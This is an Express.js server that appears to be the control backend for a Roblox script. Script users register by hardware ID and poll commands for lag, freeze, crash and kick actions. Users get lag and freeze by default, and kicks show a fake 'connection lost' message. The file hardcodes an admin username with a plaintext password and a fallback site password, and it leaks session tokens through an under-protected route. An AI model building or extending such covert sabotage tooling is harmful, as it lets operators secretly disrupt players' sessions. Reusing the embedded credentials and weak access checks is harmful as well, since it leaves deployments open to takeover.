const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// ===== PATHS AND CONFIG =====
const frontendPath = path.join(__dirname, '..', 'frontend');
const SITE_PASSWORD = process.env.SITE_PASSWORD || 'default123';
const USERS_FILE = path.join(__dirname, 'data', 'users.json');
const SESSIONS_FILE = path.join(__dirname, 'data', 'sessions.json');
const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
const ADMINS_FILE = path.join(__dirname, 'data', 'admins.json');

// Initialize data files
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'));
}

if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

if (!fs.existsSync(SESSIONS_FILE)) {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));
}

if (!fs.existsSync(SETTINGS_FILE)) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify({
        defaultKickMessage: 'Your connection has been lost. Please try again later.',
        defaultLag: 50,
        defaultFreeze: 30,
        sessionTimeout: 10
    }, null, 2));
}

// ===== DEFAULT ADMIN ACCOUNT =====
if (!fs.existsSync(ADMINS_FILE)) {
    const defaultAdmin = [{
        id: crypto.randomUUID(),
        username: 'Hate.vs',
        password: bcrypt.hashSync('zoha3234', 10),
        robloxUsername: 'Hate.vs',
        createdAt: new Date().toISOString()
    }];
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultAdmin, null, 2));
} else {
    // Check if default admin exists, if not add it
    let admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
    const exists = admins.find(a => a.username === 'Hate.vs');
    if (!exists) {
        admins.push({
            id: crypto.randomUUID(),
            username: 'Hate.vs',
            password: bcrypt.hashSync('zoha3234', 10),
            robloxUsername: 'Hate.vs',
            createdAt: new Date().toISOString()
        });
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
    }
}

// ===== HELPER FUNCTIONS =====
const readUsers = () => {
    try {
        return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch {
        return [];
    }
};

const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
};

const readSessions = () => {
    try {
        return JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf8'));
    } catch {
        return [];
    }
};

const writeSessions = (sessions) => {
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
};

const readSettings = () => {
    try {
        return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
    } catch {
        return { defaultKickMessage: 'Your connection has been lost. Please try again later.', defaultLag: 50, defaultFreeze: 30, sessionTimeout: 10 };
    }
};

const writeSettings = (settings) => {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
};

const readAdmins = () => {
    try {
        return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
    } catch {
        return [];
    }
};

const writeAdmins = (admins) => {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
};

// ===== MIDDLEWARE =====
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Authentication required' });
    }

    jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
};

const checkSitePassword = (req, res, next) => {
    if (req.path.startsWith('/api/')) {
        return next();
    }
    
    const sessionToken = req.headers['x-site-session'] || req.cookies?.siteSession;
    
    if (!sessionToken) {
        if (req.path === '/' || req.path === '/index.html') {
            return res.sendFile(path.join(frontendPath, 'gate.html'));
        }
        return res.status(401).send('Access Denied');
    }
    
    try {
        const decoded = jwt.verify(sessionToken, process.env.JWT_SECRET);
        if (decoded.type === 'site-access') {
            return next();
        }
    } catch (err) {
        if (req.path === '/' || req.path === '/index.html') {
            return res.sendFile(path.join(frontendPath, 'gate.html'));
        }
        return res.status(401).send('Access Denied');
    }
};

// ===== SITE AUTH =====
app.post('/api/site-auth', (req, res) => {
    const { password } = req.body;
    
    if (password === SITE_PASSWORD) {
        const token = jwt.sign(
            { type: 'site-access', timestamp: Date.now() },
            process.env.JWT_SECRET,
            { expiresIn: '1h' }
        );
        
        res.json({
            success: true,
            token: token
        });
    } else {
        res.status(401).json({
            success: false,
            error: 'Invalid password'
        });
    }
});

// ===== ADMIN LOGIN =====
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    const admins = readAdmins();
    const admin = admins.find(a => a.username === username);
    
    if (!admin || !bcrypt.compareSync(password, admin.password)) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const token = jwt.sign(
        { id: admin.id, username: admin.username, isOwner: true, robloxUsername: admin.robloxUsername },
        process.env.JWT_SECRET,
        { expiresIn: '24h' }
    );
    
    res.json({
        success: true,
        token,
        user: { 
            id: admin.id,
            username: admin.username, 
            robloxUsername: admin.robloxUsername,
            isOwner: true
        }
    });
});

// ===== ADMIN MANAGEMENT =====
app.get('/api/admins', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can view admins' });
    }
    const admins = readAdmins();
    res.json(admins);
});

app.post('/api/admins/create', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can create admins' });
    }
    
    const { username, password, robloxUsername } = req.body;
    if (!username || !password || !robloxUsername) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    let admins = readAdmins();
    if (admins.find(a => a.username === username)) {
        return res.status(400).json({ error: 'Admin already exists' });
    }
    
    const newAdmin = {
        id: crypto.randomUUID(),
        username,
        password: bcrypt.hashSync(password, 10),
        robloxUsername,
        createdAt: new Date().toISOString()
    };
    
    admins.push(newAdmin);
    writeAdmins(admins);
    
    res.json({ success: true, admin: { id: newAdmin.id, username: newAdmin.username, robloxUsername: newAdmin.robloxUsername } });
});

app.delete('/api/admins/:adminId', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can remove admins' });
    }
    
    let admins = readAdmins();
    admins = admins.filter(a => a.id !== req.params.adminId);
    writeAdmins(admins);
    
    res.json({ success: true });
});

// ===== USER ROUTES =====
app.post('/api/auth', (req, res) => {
    const { hwid, password } = req.body;

    if (!hwid) {
        return res.status(400).json({ error: 'HWID is required' });
    }

    let users = readUsers();
    let user = users.find(u => u.hwid === hwid);

    if (!user) {
        if (password && password === process.env.ADMIN_PASSWORD) {
            const newUser = {
                id: crypto.randomUUID(),
                hwid: hwid,
                username: req.body.username || `User_${hwid.slice(0, 8)}`,
                isOwner: true,
                createdAt: new Date().toISOString(),
                settings: {
                    lagPercentage: 0,
                    freezePercentage: 0,
                    crashEnabled: false,
                    kickMessage: 'Your connection has been lost. Please try again later.'
                }
            };
            users.push(newUser);
            writeUsers(users);
            user = newUser;
        } else {
            return res.status(401).json({ 
                error: 'HWID not registered. Contact an owner to add you.' 
            });
        }
    }

    const token = jwt.sign(
        { 
            id: user.id, 
            hwid: user.hwid, 
            isOwner: user.isOwner 
        }, 
        process.env.JWT_SECRET,
        { expiresIn: '24h' }
    );

    const sessions = readSessions();
    sessions.push({
        token,
        hwid: user.hwid,
        userId: user.id,
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    });
    writeSessions(sessions);

    res.json({
        success: true,
        token,
        user: {
            id: user.id,
            hwid: user.hwid,
            username: user.username,
            isOwner: user.isOwner,
            settings: user.settings
        }
    });
});

app.get('/api/users', authenticateToken, (req, res) => {
    const users = readUsers();
    const sessions = readSessions();
    
    const activeUsers = users.map(user => {
        const activeSession = sessions.find(s => 
            s.userId === user.id && 
            new Date(s.expiresAt) > new Date()
        );
        
        return {
            ...user,
            isActive: !!activeSession,
            sessionId: activeSession ? activeSession.token : null
        };
    });

    res.json(activeUsers);
});

app.put('/api/users/:userId/settings', authenticateToken, (req, res) => {
    const { userId } = req.params;
    const { lagPercentage, freezePercentage, crashEnabled, kickMessage } = req.body;

    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can modify settings' });
    }

    let users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);

    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }

    if (lagPercentage !== undefined) {
        users[userIndex].settings.lagPercentage = Math.min(100, Math.max(0, lagPercentage));
    }
    if (freezePercentage !== undefined) {
        users[userIndex].settings.freezePercentage = Math.min(100, Math.max(0, freezePercentage));
    }
    if (crashEnabled !== undefined) {
        users[userIndex].settings.crashEnabled = crashEnabled;
    }
    if (kickMessage !== undefined) {
        users[userIndex].settings.kickMessage = kickMessage;
    }

    writeUsers(users);

    res.json({
        success: true,
        settings: users[userIndex].settings
    });
});

app.post('/api/users/:userId/crash', authenticateToken, (req, res) => {
    const { userId } = req.params;

    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can trigger crashes' });
    }

    const users = readUsers();
    const user = users.find(u => u.id === userId);

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }

    user.settings.crashEnabled = true;
    writeUsers(users);

    res.json({
        success: true,
        message: `Crash triggered for ${user.username}`
    });
});

app.post('/api/users/:userId/kick', authenticateToken, (req, res) => {
    const { userId } = req.params;
    const { message } = req.body;

    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can kick users' });
    }

    let users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);

    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }

    if (message) {
        users[userIndex].settings.kickMessage = message;
    }

    const sessions = readSessions();
    const updatedSessions = sessions.filter(s => s.userId !== userId);
    writeSessions(updatedSessions);

    writeUsers(users);

    res.json({
        success: true,
        message: `User ${users[userIndex].username} kicked`,
        kickMessage: users[userIndex].settings.kickMessage
    });
});

app.post('/api/users/add', authenticateToken, (req, res) => {
    const { hwid, username } = req.body;

    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can add users' });
    }

    if (!hwid) {
        return res.status(400).json({ error: 'HWID is required' });
    }

    let users = readUsers();
    
    if (users.find(u => u.hwid === hwid)) {
        return res.status(400).json({ error: 'User with this HWID already exists' });
    }

    const settings = readSettings();
    const newUser = {
        id: crypto.randomUUID(),
        hwid: hwid,
        username: username || `User_${hwid.slice(0, 8)}`,
        isOwner: false,
        createdAt: new Date().toISOString(),
        settings: {
            lagPercentage: settings.defaultLag || 50,
            freezePercentage: settings.defaultFreeze || 30,
            crashEnabled: false,
            kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
        }
    };

    users.push(newUser);
    writeUsers(users);

    res.json({
        success: true,
        user: newUser
    });
});

app.delete('/api/users/:userId', authenticateToken, (req, res) => {
    const { userId } = req.params;

    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can remove users' });
    }

    let users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);

    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }

    const sessions = readSessions();
    const updatedSessions = sessions.filter(s => s.userId !== userId);
    writeSessions(updatedSessions);

    users.splice(userIndex, 1);
    writeUsers(users);

    res.json({
        success: true,
        message: 'User removed successfully'
    });
});

app.get('/api/stats', authenticateToken, (req, res) => {
    const sessions = readSessions();
    const activeSessions = sessions.filter(s => new Date(s.expiresAt) > new Date());
    
    res.json({
        totalUsers: readUsers().length,
        activeUsers: activeSessions.length,
        timestamp: new Date().toISOString()
    });
});

// ===== OWNER ROUTES =====
app.get('/api/owners', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can view owners list' });
    }
    
    const users = readUsers();
    const owners = users.filter(u => u.isOwner === true);
    const sessions = readSessions();
    
    const ownersWithStatus = owners.map(owner => {
        const activeSession = sessions.find(s => 
            s.userId === owner.id && 
            new Date(s.expiresAt) > new Date()
        );
        return {
            ...owner,
            isActive: !!activeSession
        };
    });
    
    res.json(ownersWithStatus);
});

app.post('/api/owners/add', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can add other owners' });
    }
    
    const { username, password } = req.body;
    
    if (!username) {
        return res.status(400).json({ error: 'Roblox username is required' });
    }
    
    let users = readUsers();
    
    const existing = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    if (existing) {
        return res.status(400).json({ error: 'User already registered' });
    }
    
    const settings = readSettings();
    const newOwner = {
        id: crypto.randomUUID(),
        hwid: `pending_${username}`,
        username: username,
        isOwner: true,
        createdAt: new Date().toISOString(),
        settings: {
            lagPercentage: 0,
            freezePercentage: 0,
            crashEnabled: false,
            kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
        }
    };
    
    users.push(newOwner);
    writeUsers(users);
    
    // Also create admin account if password provided
    if (password) {
        let admins = readAdmins();
        if (!admins.find(a => a.username === username)) {
            admins.push({
                id: crypto.randomUUID(),
                username: username,
                password: bcrypt.hashSync(password, 10),
                robloxUsername: username,
                createdAt: new Date().toISOString()
            });
            writeAdmins(admins);
        }
    }
    
    res.json({
        success: true,
        user: newOwner
    });
});

app.delete('/api/owners/:ownerId', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can remove owners' });
    }
    
    const { ownerId } = req.params;
    let users = readUsers();
    
    const userIndex = users.findIndex(u => u.id === ownerId);
    if (userIndex === -1) {
        return res.status(404).json({ error: 'Owner not found' });
    }
    
    if (users[userIndex].id === req.user.id) {
        return res.status(403).json({ error: 'Cannot remove yourself' });
    }
    
    users.splice(userIndex, 1);
    writeUsers(users);
    
    res.json({
        success: true,
        message: 'Owner removed successfully'
    });
});

// ===== SETTINGS ROUTES =====
app.post('/api/settings/kick-message', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can change settings' });
    }
    
    const { message } = req.body;
    if (!message) {
        return res.status(400).json({ error: 'Message is required' });
    }
    
    let settings = readSettings();
    settings.defaultKickMessage = message;
    writeSettings(settings);
    
    res.json({ success: true, message: 'Default kick message saved' });
});

app.post('/api/settings/default-lag', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can change settings' });
    }
    
    const { lagPercentage } = req.body;
    if (lagPercentage === undefined || lagPercentage < 0 || lagPercentage > 100) {
        return res.status(400).json({ error: 'Invalid lag percentage (0-100)' });
    }
    
    let settings = readSettings();
    settings.defaultLag = lagPercentage;
    writeSettings(settings);
    
    res.json({ success: true, message: 'Default lag saved' });
});

app.post('/api/settings/default-freeze', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can change settings' });
    }
    
    const { freezePercentage } = req.body;
    if (freezePercentage === undefined || freezePercentage < 0 || freezePercentage > 100) {
        return res.status(400).json({ error: 'Invalid freeze percentage (0-100)' });
    }
    
    let settings = readSettings();
    settings.defaultFreeze = freezePercentage;
    writeSettings(settings);
    
    res.json({ success: true, message: 'Default freeze saved' });
});

app.post('/api/settings/session-timeout', authenticateToken, (req, res) => {
    if (!req.user.isOwner) {
        return res.status(403).json({ error: 'Only owners can change settings' });
    }
    
    const { timeout } = req.body;
    if (!timeout || timeout < 1) {
        return res.status(400).json({ error: 'Invalid timeout value' });
    }
    
    let settings = readSettings();
    settings.sessionTimeout = timeout;
    writeSettings(settings);
    
    res.json({ success: true, message: 'Session timeout saved' });
});

app.get('/api/settings', authenticateToken, (req, res) => {
    const settings = readSettings();
    res.json(settings);
});

// ===== SCRIPT API ROUTES =====
app.post('/api/script/register', (req, res) => {
    const { hwid, robloxUsername } = req.body;
    
    if (!hwid) {
        return res.status(400).json({ error: 'HWID is required' });
    }
    
    let users = readUsers();
    let user = users.find(u => u.hwid === hwid);
    const settings = readSettings();
    
    if (!user) {
        const newUser = {
            id: crypto.randomUUID(),
            hwid: hwid,
            username: robloxUsername || `User_${hwid.slice(0, 8)}`,
            isOwner: false,
            createdAt: new Date().toISOString(),
            settings: {
                lagPercentage: settings.defaultLag || 50,
                freezePercentage: settings.defaultFreeze || 30,
                crashEnabled: false,
                kickMessage: settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
            }
        };
        users.push(newUser);
        writeUsers(users);
        user = newUser;
    }
    
    if (robloxUsername && user.username !== robloxUsername) {
        user.username = robloxUsername;
        writeUsers(users);
    }
    
    const sessions = readSessions();
    const existingSession = sessions.find(s => s.userId === user.id);
    
    if (existingSession) {
        existingSession.expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    } else {
        sessions.push({
            userId: user.id,
            hwid: hwid,
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString()
        });
    }
    writeSessions(sessions);
    
    res.json({
        success: true,
        user: {
            id: user.id,
            username: user.username,
            hwid: user.hwid,
            isOwner: user.isOwner,
            settings: {
                lagPercentage: user.settings.lagPercentage || settings.defaultLag || 50,
                freezePercentage: user.settings.freezePercentage || settings.defaultFreeze || 30,
                crashEnabled: user.settings.crashEnabled || false,
                kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
            }
        }
    });
});

app.get('/api/script/commands/:hwid', (req, res) => {
    const { hwid } = req.params;
    
    let users = readUsers();
    const user = users.find(u => u.hwid === hwid);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const settings = readSettings();
    
    res.json({
        success: true,
        commands: {
            lagPercentage: user.settings.lagPercentage || settings.defaultLag || 50,
            freezePercentage: user.settings.freezePercentage || settings.defaultFreeze || 30,
            crashEnabled: user.settings.crashEnabled || false,
            kickMessage: user.settings.kickMessage || settings.defaultKickMessage || 'Your connection has been lost. Please try again later.'
        }
    });
});

app.post('/api/script/heartbeat', (req, res) => {
    const { hwid } = req.body;
    
    if (!hwid) {
        return res.status(400).json({ error: 'HWID is required' });
    }
    
    let users = readUsers();
    const user = users.find(u => u.hwid === hwid);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const sessions = readSessions();
    const session = sessions.find(s => s.userId === user.id);
    
    if (session) {
        session.expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
        writeSessions(sessions);
    }
    
    res.json({ success: true });
});

// ===== SERVE FRONTEND =====
app.use(express.static(frontendPath));
app.use(checkSitePassword);

app.get('/', (req, res) => {
    res.sendFile(path.join(frontendPath, 'index.html'));
});

// ===== START SERVER =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});